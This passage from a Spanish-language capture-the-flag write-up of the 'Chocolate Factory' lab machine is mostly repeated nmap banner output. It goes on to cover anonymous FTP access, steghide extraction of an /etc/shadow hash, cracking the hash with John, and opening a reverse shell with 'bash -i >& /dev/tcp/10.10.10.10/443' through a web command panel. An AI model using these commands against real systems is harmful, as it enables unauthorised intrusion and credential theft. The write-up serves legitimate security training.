+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">115/tcp open  sftp?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">116/tcp open  ansanotify?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">117/tcp open  uucp-path?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">118/tcp open  sqlserv?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">119/tcp open  nntp?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">120/tcp open  cfdptkt?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GetRequest, HTTPOptions: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">121/tcp open  erpc?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">122/tcp open  smakynet?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">123/tcp open  ntp?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">124/tcp open  ansatrader?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">125/tcp open  locus-map?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="err">&#39;</span>_<span class="p">;</span>-----------------<span class="sb">`</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\|</span>______________________<span class="p">;</span>________________<span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     small hint from Mr.Wonka : Look somewhere <span class="k">else</span>, its not here! <span class="p">;</span><span class="o">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    hope you wont drown Augustus<span class="s2">&#34;
+</span></span></span></code></pre></div><table>
+<thead>
+<tr>
+<th style="text-align:center">Parámetro</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-p</td>
+<td>Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior</td>
+</tr>
+<tr>
+<td style="text-align:center">-sC</td>
+<td>Para que realice scripts básicos de reconocimiento</td>
+</tr>
+<tr>
+<td style="text-align:center">-sV</td>
+<td>Proporciona la versión e información de los servicios que corren por los puertos</td>
+</tr>
+</tbody>
+</table>
+<div id="puerto-80" class="anchor">Puerto 80></div>
+<h2 class="relative group">Puerto 80 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#puerto-80" aria-label="Anchor">#</a></span>        
+    
+</h2><p>Con el whatweb podemos ver más información de la web</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ whatweb 10.10.250.47
+</span></span><span class="line"><span class="cl">http://10.10.250.47 <span class="o">[</span><span class="m">200</span> OK<span class="o">]</span> Apache<span class="o">[</span>2.4.29<span class="o">]</span>, Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, HTML5, HTTPServer<span class="o">[</span>Ubuntu Linux<span class="o">][</span>Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP<span class="o">[</span>10.10.250.47<span class="o">]</span>, PasswordField<span class="o">[</span>password<span class="o">]</span>
+</span></span></code></pre></div><p>Al entrar a la web hay un panel de login, e probado con admin:admin y las típicas credenciales pero nada.</p>
+<p>El wappalayzer no reporta nada interesante.</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        srcset="
+        /thm/chocolatefactory/images/login_hu55794d4730ab618d4be8c0191c88d201_267686_330x0_resize_box_3.png 330w,
+        /thm/chocolatefactory/images/login_hu55794d4730ab618d4be8c0191c88d201_267686_660x0_resize_box_3.png 660w,
+        /thm/chocolatefactory/images/login_hu55794d4730ab618d4be8c0191c88d201_267686_1024x0_resize_box_3.png 1024w,
+        /thm/chocolatefactory/images/login_hu55794d4730ab618d4be8c0191c88d201_267686_1320x0_resize_box_3.png 2x"
+        src="/thm/chocolatefactory/images/login_hu55794d4730ab618d4be8c0191c88d201_267686_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<div id="puerto-21" class="anchor">Puerto 21></div>
+<h2 class="relative group">Puerto 21 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#puerto-21" aria-label="Anchor">#</a></span>        
+    
+</h2><p>El nmap reporto que se podía entrar al puerto 21 como anónimo (<code>ftp-anon: Anonymous FTP login allowed</code>)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ftp 10.10.250.47
+</span></span><span class="line"><span class="cl">Connected to 10.10.250.47.
+</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.250.47:d3b0<span class="o">)</span>: anonymous
+</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
+</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
+</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
+</span></span><span class="line"><span class="cl">ftp&gt; 
+</span></span></code></pre></div><p>Dentro solo hay una foto <code>gum_room.jpg</code>, con <code>get gum_room.jpg</code> nos la podemos pasar a nuestra máquina, la foto es la siguiente:</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        srcset="
+        /thm/chocolatefactory/images/gum_hu6cf4d5dd282a715f610d0635eab1306f_1410051_330x0_resize_box_3.png 330w,
+        /thm/chocolatefactory/images/gum_hu6cf4d5dd282a715f610d0635eab1306f_1410051_660x0_resize_box_3.png 660w,
+        /thm/chocolatefactory/images/gum_hu6cf4d5dd282a715f610d0635eab1306f_1410051_1024x0_resize_box_3.png 1024w,
+        /thm/chocolatefactory/images/gum_hu6cf4d5dd282a715f610d0635eab1306f_1410051_1320x0_resize_box_3.png 2x"
+        src="/thm/chocolatefactory/images/gum_hu6cf4d5dd282a715f610d0635eab1306f_1410051_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>Para ver si hay algo oculto en la foto usamos steghide</p>
+<p>Steghide es un software de esteganografía de código abierto que permite ocultar un archivo secreto en un archivo de imagen o audio.</p>
+<p>No notarás ningún cambio en la imagen o el archivo de audio. Sin embargo, el archivo secreto estará dentro de la imagen original o el archivo de audio. Es un software de línea de comando.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Si no tienes instalado el &#34;steghide&#34; lo puedes descargar con</span>
+</span></span><span class="line"><span class="cl">sudo apt install steghide
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ steghide extract -sf gum_room.jpg
+</span></span><span class="line"><span class="cl">Anotar salvoconducto: 
+</span></span><span class="line"><span class="cl">anot� los datos extra�dos e/<span class="s2">&#34;b64.txt&#34;</span>.
+</span></span></code></pre></div><p>Ahora se a creado un archivo b64.txt que está encriptado con base64</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat b64.txt <span class="p">|</span> base64 -d &gt; decode.txt
+</span></span></code></pre></div><p>Ahora en el decode.txt ya está el contenido</p>
+<pre tabindex="0"><code>...
+...
+charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
+</code></pre><p>Esto parece ser el /etc/shadow</p>
+<p>El fichero /etc/shadow almacena las contraseñas de las cuentas de usuario. Se utiliza este fichero por seguridad. /etc/shadow es un archivo de texto que contiene información sobre las contraseñas de los usuarios del sistema. Es propiedad del usuario root y del grupo oculto</p>
+<p>Al final de todo se puede ver el usuario charlie, junto a un hash sha512 (se puede saber que tipo es porque empieza con $6$)</p>
+<p>Para romper el hash vamos a usar John the Ripper, que es una herramienta para recuperación de contraseñas. Originalmente desarrollado para el sistema operativo Unix</p>
+<pre tabindex="0"><code>sudo apt install john
+echo &#34;hash&#34; &gt; myhash.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt mihash.hash
+john --show mihash.hash
+</code></pre><div id="homephp" class="anchor">home.php></div>
+<h2 class="relative group">home.php 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#homephp" aria-label="Anchor">#</a></span>        
+    
+</h2><p>Esto nos devuelve el usuario charlie con la contraseña, al probarlos en la web, nos lleva a otra página.</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        srcset="
+        /thm/chocolatefactory/images/remote_hud27725407893b15b7d96a74ea8ab70cd_217590_330x0_resize_box_3.png 330w,
+        /thm/chocolatefactory/images/remote_hud27725407893b15b7d96a74ea8ab70cd_217590_660x0_resize_box_3.png 660w,
+        /thm/chocolatefactory/images/remote_hud27725407893b15b7d96a74ea8ab70cd_217590_1024x0_resize_box_3.png 1024w,
+        /thm/chocolatefactory/images/remote_hud27725407893b15b7d96a74ea8ab70cd_217590_1320x0_resize_box_3.png 2x"
+        src="/thm/chocolatefactory/images/remote_hud27725407893b15b7d96a74ea8ab70cd_217590_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>Desde aquí se pueden ejecutar comandos a la máquina víctima.</p>
+<div id="reverse-shell" class="anchor">Reverse shell></div>
+<h2 class="relative group">Reverse shell 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#reverse-shell" aria-label="Anchor">#</a></span>        
+    
+</h2><p>Primero nos ponemos en escucha por el puerto 443</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nlvp <span class="m">443</span>
+</span></span></code></pre></div><p>Intentamos crear una reverse shell mandando <code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1</code>, pero no recibimos nada, probamos añadiendo (bash -c &ldquo;&rdquo;) de tal forma que quede así <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&quot;</code> Ahora ya si</p>
+<div id="tratamiento-de-la-tty" class="anchor">Tratamiento de la tty></div>
+<h2 class="relative group">Tratamiento de la tty 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#tratamiento-de-la-tty" aria-label="Anchor">#</a></span>        
+    
+</h2><p>Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
+</span></span></code></pre></div><p>ctrl + z</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reset
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xterm
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
